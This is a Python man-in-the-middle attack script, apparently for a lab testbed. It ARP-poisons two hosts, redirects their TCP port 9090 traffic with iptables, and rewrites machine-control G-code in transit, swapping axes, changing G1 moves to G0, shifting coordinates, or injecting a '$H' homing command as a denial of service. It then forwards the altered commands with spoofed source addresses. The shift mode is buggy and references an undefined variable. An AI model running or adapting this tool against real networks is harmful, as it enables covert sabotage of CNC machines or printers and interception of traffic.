import socket, sys, os, signal, atexit, json, threading, re
from datetime import datetime
from scapy.all import *
import time
import subprocess
import struct

print("MITM Proxy with Mode Selection, Enhanced Packet Logging, and IP Spoofing...")

# Get mode argument from command-line
if len(sys.argv) < 2:
    print("Usage: python3 xy_modify_mitm.py [xy | g1g0 | dos | default]")
    sys.exit(1)
mode = sys.argv[1].lower()

# Create a logs directory if it doesn't exist
LOG_DIR = "/volumes/logs/"
os.makedirs(LOG_DIR, exist_ok=True)
print(f"Log files will be saved in: {os.path.abspath(LOG_DIR)}")

# Create a control file to facilitate IPC between dashboard and MITM
CONTROL_FILE = "/volumes/logs/mitm_control.json"

# Global state variables
poisoning_enabled = False
sniffer_enabled = False
arp_poison_thread = None
sniffer_thread = None
stop_poison_flag = threading.Event()  # Event to signal the poison thread to stop
shift_percent =10

# Initialize the control file with default values
def init_control_file():
    control_data = {
        "poisoning_enabled": poisoning_enabled,
        "sniffer_enabled": sniffer_enabled,
        "mode": mode,
        "timestamp": datetime.utcnow().isoformat(),
        "shift_percent": 10
    }
    with open(CONTROL_FILE, "w") as f:
        json.dump(control_data, f)
    print(f"Initialized control file: {CONTROL_FILE}")

# Check control file for commands
def check_control_file():
    global poisoning_enabled, sniffer_enabled, sniffer_thread, arp_poison_thread, stop_poison_flag, shift_percent
    
    try:
        if os.path.exists(CONTROL_FILE):
            with open(CONTROL_FILE, "r") as f:
                control_data = json.load(f)
                
                # Check if poisoning state has changed
                if control_data.get("poisoning_enabled") != poisoning_enabled:
                    poisoning_enabled = control_data.get("poisoning_enabled", False)
                    print(f"[CONTROL] Poisoning state changed to: {poisoning_enabled}")
                    
                    if poisoning_enabled and (arp_poison_thread is None or not arp_poison_thread.is_alive()):
                        # Start poisoning
                        stop_poison_flag.clear()  # Clear the stop flag
                        arp_poison_thread = run_arp_poison()
                        print("[CONTROL] ARP poisoning started")
                    elif not poisoning_enabled and arp_poison_thread and arp_poison_thread.is_alive():
                        # Stop poisoning
                        stop_poison_flag.set()  # Set the stop flag
                        restore_arp_tables()  # Restore ARP tables
                        print("[CONTROL] ARP poisoning stopped")
                
                # Check if sniffer state has changed
                if control_data.get("sniffer_enabled") != sniffer_enabled:
                    sniffer_enabled = control_data.get("sniffer_enabled", False)
                    print(f"[CONTROL] Sniffer state changed to: {sniffer_enabled}")
                    
                    if sniffer_enabled and (sniffer_thread is None or not sniffer_thread.is_alive()):
                        # Start sniffer
                        sniffer_thread = threading.Thread(target=start_sniffer, daemon=True)
                        sniffer_thread.start()
                        print("[CONTROL] Packet sniffer started")
                    # Note: Stopping a sniffer thread is tricky and might require a different approach
    
    except Exception as e:
        print(f"[CONTROL] Error checking control file: {e}")

# Update the control file with current state
def update_control_file():
    control_data = {
        "poisoning_enabled": poisoning_enabled,
        "sniffer_enabled": sniffer_enabled,
        "mode": mode,
        "timestamp": datetime.utcnow().isoformat(),
        "shift_percent": shift_percent
    }
    with open(CONTROL_FILE, "w") as f:
        json.dump(control_data, f)

def cleanup():
    """Cleanup logic for exit"""
    print("Cleaning up resources...")
    os.system("iptables -D INPUT -s 10.9.0.5 -p tcp --dport 9090 -j DROP 2>/dev/null")
    os.system("iptables -D FORWARD -s 10.9.0.5 -p tcp --dport 9090 -j DROP 2>/dev/null")
    
    # Restore ARP tables before exiting
    restore_arp_tables()
    
    # Make sure the control file reflects our shutdown
    global poisoning_enabled, sniffer_enabled
    poisoning_enabled = False
    sniffer_enabled = False
    update_control_file()

def signal_handler(sig, frame):
    """Signal Handler for graceful exit"""
    print("Interrupt received. Exiting gracefully...")
    sys.exit(0)

def setup_iptables():
    """Setup logic for IPtables"""
    print("Setting up iptables rules...")
    os.system("iptables -F")  # Flush all existing rules
    os.system("iptables -t nat -F")  # Flush NAT table rules
    os.system("killall -9 python3 2>/dev/null")  # Kill any other Python scripts that might be using the port
    time.sleep(1)  # Give system time to release resources
    
    # Enable IP forwarding (required for MITM)
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    # Allow spoofed packets to be sent out
    os.system("echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter")
    os.system("echo 0 > /proc/sys/net/ipv4/conf/eth0/rp_filter")
    os.system("echo 0 > /proc/sys/net/ipv4/conf/default/rp_filter")
    
    # Capture packets from HostA to HostB
    os.system("iptables -t nat -A PREROUTING -s 10.9.0.5 -d 10.9.0.6 -p tcp --dport 9090 -j REDIRECT --to-port 9091")
    
    # Make sure we don't block our own traffic
    os.system("iptables -A INPUT -p tcp --dport 9091 -j ACCEPT")
    
    print("Iptables setup complete")

# TCP flag constants for parsing raw packets
TCP_FIN = 0x01
TCP_SYN = 0x02
TCP_RST = 0x04
TCP_PSH = 0x08
TCP_ACK = 0x10
TCP_URG = 0x20
TCP_ECE = 0x40
TCP_CWR = 0x80

def parse_tcp_flags(flag_byte):
    """Convert a TCP flag byte value to a human-readable string"""
    flags = []
    if flag_byte & TCP_FIN: flags.append('FIN')
    if flag_byte & TCP_SYN: flags.append('SYN')
    if flag_byte & TCP_RST: flags.append('RST')
    if flag_byte & TCP_PSH: flags.append('PSH')
    if flag_byte & TCP_ACK: flags.append('ACK')
    if flag_byte & TCP_URG: flags.append('URG')
    if flag_byte & TCP_ECE: flags.append('ECE')
    if flag_byte & TCP_CWR: flags.append('CWR')
    return ' '.join(flags)

def extract_tcp_headers(raw_data):
    """Extract TCP/IP header information from raw packet data"""
    try:
        # Create a packet from the raw data for easier parsing
        pkt = IP(raw_data)
        
        # Initialize with default values
        src_ip = "unknown"
        dst_ip = "unknown"
        src_port = 0
        dst_port = 0
        flags = ""
        seq = 0
        ack = 0
        window = 0
        header_length = 0
        
        # Extract IP header information
        if IP in pkt:
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst
            
            # Extract TCP header information
            if TCP in pkt:
                tcp = pkt[TCP]
                src_port = tcp.sport
                dst_port = tcp.dport
                flags = tcp.flags
                seq = tcp.seq
                ack = tcp.ack
                window = tcp.window
                header_length = tcp.dataofs * 4
                
                # Convert flags to string
                flags = str(flags)
        
        return {
            "src_ip": src_ip,
            "dst_ip": dst_ip,
            "src_port": src_port,
            "dst_port": dst_port,
            "flags": flags,
            "seq": seq,
            "ack": ack,
            "window": window,
            "tcp_header_length": header_length
        }
    except Exception as e:
        print(f"Error extracting TCP headers: {e}")
        # Return default values if extraction fails
        return {
            "src_ip": "unknown",
            "dst_ip": "unknown",
            "src_port": 0,
            "dst_port": 0,
            "flags": "",
            "seq": 0,
            "ack": 0,
            "window": 0,
            "tcp_header_length": 0
        }

def log_packet_details(packet_data, is_original=True, src_ip="unknown", dst_ip="unknown", src_port=0, dst_port=0, flags="", seq=0, ack=0):
    """Unified logging function for both sniffed and intercepted packets"""
    try:
        # Initialize common fields
        window = 0
        header_length = 0
        payload = ""

        # If packet_data is a Scapy packet
        if isinstance(packet_data, Packet) and IP in packet_data and TCP in packet_data:
            src_ip = packet_data[IP].src
            dst_ip = packet_data[IP].dst
            src_port = packet_data[TCP].sport
            dst_port = packet_data[TCP].dport
            flags = str(packet_data[TCP].flags)
            seq = packet_data[TCP].seq
            ack = packet_data[TCP].ack
            window = packet_data[TCP].window
            header_length = packet_data[TCP].dataofs * 4
            if Raw in packet_data:
                payload = packet_data[Raw].load.decode(errors='ignore').strip()

        # If it's a decoded string payload
        elif isinstance(packet_data, str):
            payload = packet_data.strip()

        # If it's bytes, decode it
        elif isinstance(packet_data, bytes):
            payload = packet_data.decode(errors='ignore').strip()

        # Final log entry
        log_data = {
            "timestamp": datetime.utcnow().isoformat(),
            "packet_type": "Original" if is_original else "Modified",
            "src_ip": src_ip,
            "dst_ip": dst_ip,
            "src_port": src_port,
            "dst_port": dst_port,
            "flags": flags,
            "seq": seq,
            "ack": ack,
            "window": window,
            "tcp_header_length": header_length,
            "payload_length": len(payload),
            "payload": payload
        }

        # Write to log file
        log_filename = os.path.join(LOG_DIR, f"packet_log_{datetime.now().strftime('%Y-%m-%d_%H')}.json")
        with open(log_filename, "a") as logfile:
            logfile.write(json.dumps(log_data) + "\n")
            logfile.flush()

        print(f"[{log_data['packet_type']} PACKET] {src_ip}:{src_port} -> {dst_ip}:{dst_port} | Flags: {flags} | Payload: {payload[:50]}...")
        print(f"Log saved to: {log_filename}")

    except Exception as e:
        print(f"Error logging packet details: {e}")
        print(f"Attempted to write to: {os.path.join(LOG_DIR, 'packet_log.json')}")


def forward_original_packet(src_ip, src_port, dst_ip, dst_port, payload):
    """Forward the packet with original source IP but using normal socket
    This method uses a standard socket but configures iptables to rewrite the source.
    """
    try:
        # Set up source NAT rule to make outgoing connections appear from the original client
        os.system(f"iptables -t nat -A POSTROUTING -s {get_local_ip()} -d {dst_ip} -p tcp --dport {dst_port} -j SNAT --to-source {src_ip}")

        # Create a standard socket connection (which will be source-NATed)
        forward_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Set socket timeout
        forward_sock.settimeout(5)
        
        # Connect to destination
        try:
            forward_sock.connect((dst_ip, dst_port))
            forward_sock.send(payload)
            print(f"Sent packet with SNAT from {src_ip}:{src_port} to {dst_ip}:{dst_port}")
            
            # Optional: Wait for response
            try:
                response = forward_sock.recv(4096)
                print(f"Received response: {response.decode(errors='ignore')[:50]}...")
            except socket.timeout:
                print("No response received (timeout)")
            
            forward_sock.close()
            
            # Remove the SNAT rule we added
            os.system(f"iptables -t nat -D POSTROUTING -s {get_local_ip()} -d {dst_ip} -p tcp --dport {dst_port} -j SNAT --to-source {src_ip}")
            return True
        except Exception as e:
            print(f"Socket error: {e}")
            # Make sure to remove the rule if we failed
            os.system(f"iptables -t nat -D POSTROUTING -s {get_local_ip()} -d {dst_ip} -p tcp --dport {dst_port} -j SNAT --to-source {src_ip}")
            return False
            
    except Exception as e:
        print(f"Error forwarding packet: {e}")
        return False

def get_local_ip():
    """Get the local IP address of the interface"""
    try:
        # Create a socket to determine local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Doesn't actually send anything
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        # Fallback method if the above fails
        return conf.iface

def send_spoofed_packet(src_ip, src_port, dst_ip, dst_port, payload, seq=0, ack=0):
    """Send a packet with spoofed source IP and port using Scapy
    This is kept for reference but not used as primary method
    """
    try:
        # Create a complete TCP/IP packet with spoofed source
        ip_layer = IP(src=src_ip, dst=dst_ip)
        tcp_layer = TCP(sport=src_port, dport=dst_port, flags="PA", seq=seq, ack=ack)
        
        # Add the payload
        packet = ip_layer/tcp_layer/Raw(load=payload)
        
        # Send the packet
        send(packet, verbose=0)
        print(f"Sent spoofed packet from {src_ip}:{src_port} to {dst_ip}:{dst_port}")
        return True
    except Exception as e:
        print(f"Error sending spoofed packet: {e}")
        return False

#Helper function for Shift Coordinates
def shift_xyz_coords(gcode_line, shift_percent):
    pattern = r"([XYZ])([-+]?\d*\.?\d+)"
    def shift(match):
        axis, value = match.groups()
        new_value = float(value) * (1 + shift_percent / 100.0)
        return f"{axis}{new_value:.3f}"
    return re.sub(pattern, shift, gcode_line)

#@####
def receive_and_modify():
    """Receive & Modify Packet - IMPROVED VERSION"""
    # Create a socket to listen for redirected traffic
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 9091))
    sock.listen(5)
    print("Listening for redirected traffic on port 9091...")
    
    # Set socket to non-blocking so we can check control file periodically
    sock.settimeout(3)
    
    # Track recently seen packets to avoid duplicate logging
    recent_packets = {}  # Key: (src_port, payload_hash), Value: timestamp
    PACKET_CACHE_TIMEOUT = 5  # seconds
    
    while True:
        try:
            # Check for control updates
            check_control_file()
            
            # Clean up old entries from recent_packets
            current_time = time.time()
            recent_packets = {k: v for k, v in recent_packets.items() 
                            if current_time - v < PACKET_CACHE_TIMEOUT}
            
            try:
                client_sock, addr = sock.accept()
                client_port = addr[1]
                print(f"\nConnection from {addr}")
                
                # Read data from the connection
                data = client_sock.recv(4096)
                if not data:
                    client_sock.close()
                    continue
                
                try:
                    # Parse TCP headers for logging
                    headers = {
                        "src_ip": "10.9.0.5",
                        "dst_ip": "10.9.0.6", 
                        "src_port": client_port,
                        "dst_port": 9090,
                        "flags": "PA",  # Default to PSH+ACK
                        "seq": 0,
                        "ack": 0
                    }
                    
                    # Decode the original payload
                    original_payload = data.decode(errors='ignore').strip()
                    print(f"Intercepted: {original_payload}")
                    
                    # Create packet identifier
                    packet_key = (client_port, hash(original_payload))
                    
                    # Check if we've seen this packet recently
                    if packet_key not in recent_packets:
                        # This is a new packet, log it as original
                        recent_packets[packet_key] = current_time
                        
                        # Log the original packet
                        log_packet_details(
                            packet_data=original_payload, 
                            is_original=True,
                            src_ip=headers["src_ip"],
                            dst_ip=headers["dst_ip"],
                            src_port=headers["src_port"],
                            dst_port=headers["dst_port"],
                            flags=headers["flags"],
                            seq=headers["seq"],
                            ack=headers["ack"]
                        )
                    else:
                        print(f"Skipping duplicate packet logging")
                    
                    ### MITM MODIFICATION LOGIC ###
                    modified_payload = original_payload  # Default: no modification
                    was_modified = False
                    
                    if mode == "xy":
                        if 'X' in original_payload:
                            modified_payload = original_payload.replace('X', 'Y')
                            was_modified = True
                            print(f"Modified: X → Y")
                        else:
                            print("No modification needed (no X found)")

                    elif mode == "g1g0":
                        if 'G1' in original_payload:
                            modified_payload = original_payload.replace('G1', 'G0')
                            was_modified = True
                            print(f"Modified: G1 → G0")
                        else:
                            print("No modification needed (no G1 found)")

                    elif mode == "dos":
                        modified_payload = "$H"  # Home command for DoS
                        was_modified = True
                        print(f"Initiating DoS Command: $H")
                        
                    elif mode == "default":
                        modified_payload = f"[MODIFIED] {original_payload}"
                        was_modified = True

                    elif mode == "shift":
                        shift_percent = control_data.get("shift_percent", 10)  # default to 10%
                        if "X" in original_payload or "Y" in original_payload or "Z" in original_payload:
                            modified_payload = shift_xyz_coords(original_payload, shift_percent)

            
                        
                    else:
                        print(f"Unknown mode: {mode}")
                        sys.exit(1)
                    
                    # Prepare the data to send
                    if was_modified:
                        # Only log modified packet if it's actually different
                        modified_data = (modified_payload + '\n').encode()
                        
                        # Log the MODIFIED packet
                        log_packet_details(
                            packet_data=modified_payload,
                            is_original=False,
                            src_ip=headers["src_ip"],
                            dst_ip=headers["dst_ip"],
                            src_port=headers["src_port"],
                            dst_port=headers["dst_port"],
                            flags=headers["flags"],
                            seq=headers["seq"],
                            ack=headers["ack"]
                        )
                        
                        print(f"Forwarding modified payload to HostB: {modified_payload}")
                    else:
                        # No modification occurred, just send original
                        modified_data = (original_payload + '\n').encode()
                        print(f"Forwarding original payload to HostB: {original_payload}")
                    
                    # Forward the packet (modified or original)
                    forward_success = forward_original_packet(
                        src_ip="10.9.0.5",
                        src_port=client_port,
                        dst_ip="10.9.0.6",
                        dst_port=9090,
                        payload=modified_data
                    )
                    
                    if not forward_success:
                        print(f"Failed to forward packet")
                    
                    # Clean up
                    client_sock.close()
                    
                except Exception as e:
                    print(f"Error processing connection: {e}\n")
                    client_sock.close()
                    
            except socket.timeout:
                # This is expected - allows us to check the control file periodically
                pass
                
        except KeyboardInterrupt:
            print("\nStopping packet interception...")
            break
        except Exception as e:
            print(f"Error in main loop: {e}")
            time.sleep(1)

def sniff_packet_callback(packet):
    if IP in packet and TCP in packet:
        log_packet_details(packet_data=packet)

def restore_arp_tables():
    """Restore normal ARP tables"""
    print("[*] Restoring ARP tables...")
    victim_ip = "10.9.0.5"
    target_ip = "10.9.0.6"
    
    try:
        victim_mac = getmacbyip(victim_ip)
        target_mac = getmacbyip(target_ip)
        
        if victim_mac and target_mac:
            # Send correct ARP information to both hosts
            send(ARP(op=2, pdst=victim_ip, psrc=target_ip, hwdst=victim_mac, hwsrc=target_mac), count=5, verbose=0)
            send(ARP(op=2, pdst=target_ip, psrc=victim_ip, hwdst=target_mac, hwsrc=victim_mac), count=5, verbose=0)
            print("[*] ARP tables restored")
        else:
            print("[!] Could not get MAC addresses for ARP restoration")
    except Exception as e:
        print(f"[!] Error restoring ARP tables: {e}")

def run_arp_poison():
    """Run continual ARP spoofing to maintain position between victim and target"""
    victim_ip = "10.9.0.5"  # HostA
    target_ip = "10.9.0.6"  # HostB
    
    # Get MAC addresses
    victim_mac = getmacbyip(victim_ip)
    target_mac = getmacbyip(target_ip)
    attacker_mac = get_if_hwaddr(conf.iface)
    
    print(f"[*] Starting ARP spoofing attack...")
    print(f"[*] Victim (HostA): {victim_ip} [{victim_mac}]")
    print(f"[*] Target (HostB): {target_ip} [{target_mac}]")
    print(f"[*] Attacker: {conf.iface} [{attacker_mac}]")
    
    # Function for continuous ARP poisoning
    def poison_targets():
        while not stop_poison_flag.is_set():  # Check if we should stop
            try:
                # Tell victim that we are the target
                send(ARP(op=2, pdst=victim_ip, psrc=target_ip, hwdst=victim_mac, hwsrc=attacker_mac), verbose=0)
                
                # Tell target that we are the victim
                send(ARP(op=2, pdst=target_ip, psrc=victim_ip, hwdst=target_mac, hwsrc=attacker_mac), verbose=0)
                
                # Small delay between sends
                time.sleep(2)
                
            except Exception as e:
                print(f"[!] Error in ARP poisoning: {e}")
                time.sleep(1)
        
        print("[*] ARP poisoning thread exiting")
        
        # Restore correct ARP entries when stopping
        restore_arp_tables()
    
    # Start ARP poisoning in a separate thread
    arp_thread = threading.Thread(target=poison_targets, daemon=True)
    arp_thread.start()
    print("[*] ARP spoofing attack started")
    
    return arp_thread

def start_sniffer():
    """Start a background sniffer on TCP port 9090"""
    print("Starting packet sniffer on port 9090...")
    
    # Create a BPF filter expression
    filter_expr = "tcp port 9090"
    
    # Start sniffing
    try:
        sniff(filter=filter_expr, prn=sniff_packet_callback, store=0)
    except Exception as e:
        print(f"[!] Error in sniffer: {e}")

def control_monitor():
    """Thread to continuously monitor the control file"""
    while True:
        try:
            check_control_file()
            time.sleep(1)  # Check once per second
        except Exception as e:
            print(f"[CONTROL] Error in monitor thread: {e}")
            time.sleep(5)  # Back off on error

def main():
    # Make sure we have root privileges
    if os.geteuid() != 0:
        print("[!] This script must be run as root!")
        sys.exit(1)

    print("Starting real-time TCP MITM with advanced IP spoofing...")
    print(f"Log directory: {os.path.abspath(LOG_DIR)}")
    print(f"Running in {mode.upper()} mode")

    # Register cleanup and signal handlers
    atexit.register(cleanup)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Initialize control file
    init_control_file()

    # Start control monitor in a separate thread
    monitor_thread = threading.Thread(target=control_monitor, daemon=True)
    monitor_thread.start()

    setup_iptables()

    try:
        # Check connectivity to both hosts
        print("\n[*] Testing connectivity to hosts...")
        host_a_reachable = os.system(f"ping -c 1 10.9.0.5 >/dev/null 2>&1") == 0
        host_b_reachable = os.system(f"ping -c 1 10.9.0.6 >/dev/null 2>&1") == 0
        
        if not host_a_reachable:
            print("[!] Warning: Cannot reach HostA (10.9.0.5)")
        if not host_b_reachable:
            print("[!] Warning: Cannot reach HostB (10.9.0.6)")
        
        # ARP poisoning and sniffer are now only started when toggled from dashboard
        # or enabled in the control file
        
        # Start intercepting and modifying packets
        print("\n[*] Starting packet interception...")
        receive_and_modify()
    except KeyboardInterrupt:
        print("\nStopping...")
    except Exception as e:
        print(f"\n[!] Error in main execution: {e}")
    finally:
        print("\nRestoring network state...")
        
        # Restore ARP tables and system state
        restore_arp_tables()
        
        # Reset IP forwarding and rp_filter to default
        try:
            print("[*] Resetting kernel parameters...")
            os.system("echo 1 > /proc/sys/net/ipv4/conf/all/rp_filter")
            os.system("echo 1 > /proc/sys/net/ipv4/conf/eth0/rp_filter")
            os.system("echo 1 > /proc/sys/net/ipv4/conf/default/rp_filter")
        except Exception as e:
            print(f"[!] Error resetting kernel parameters: {e}")
        
        # Clean up iptables
        try:
            print("[*] Cleaning up iptables rules...")
            os.system("iptables -F")
            os.system("iptables -t nat -F")
        except Exception as e:
            print(f"[!] Error cleaning up iptables: {e}")
            
        print("[*] MITM session terminated")

if __name__ == "__main__":
    main()
